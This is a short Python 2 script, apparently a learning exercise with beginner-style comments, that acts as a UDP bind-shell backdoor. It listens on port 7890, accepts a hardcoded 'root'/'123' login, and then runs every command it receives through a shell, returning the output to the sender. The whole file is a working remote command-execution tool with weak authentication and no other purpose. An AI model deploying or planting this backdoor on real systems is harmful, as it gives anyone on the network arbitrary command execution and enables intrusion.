#!/usr/bin/env python2

import  socket
import  commands
import  subprocess
#  we are looking for UDP (user datagram protocol )
#              ip_version4,         UDP 
s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
# defining ip and port below 
# ip="192.168.1.37"
port=7890
#  binind ip and port with bind function that takes input as tuple
s.bind(("",port))
#  authenticating client
user = s.recvfrom(10)
password = s.recvfrom(10)
if user[0] == 'root' and password[0] == '123' :
        s.sendto("ok",user[1])

        #  rec  data from  client 
        while True:
        #  only  accepting  commands with  20 char 
                client_data=s.recvfrom(20)
        #   only  client  data is stored
                recvcmd=client_data[0]
        #  executing  client data 
                if  'exit' in recvcmd or 'close' in  recvcmd :
                        exit()
                else :
                        proc = subprocess.Popen(recvcmd, shell = True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                        out , err = proc.communicate()
                        s.sendto(out+err,client_data[1])
                                
else :
        s.sendto("bad login username or password",user[1])
s.close()























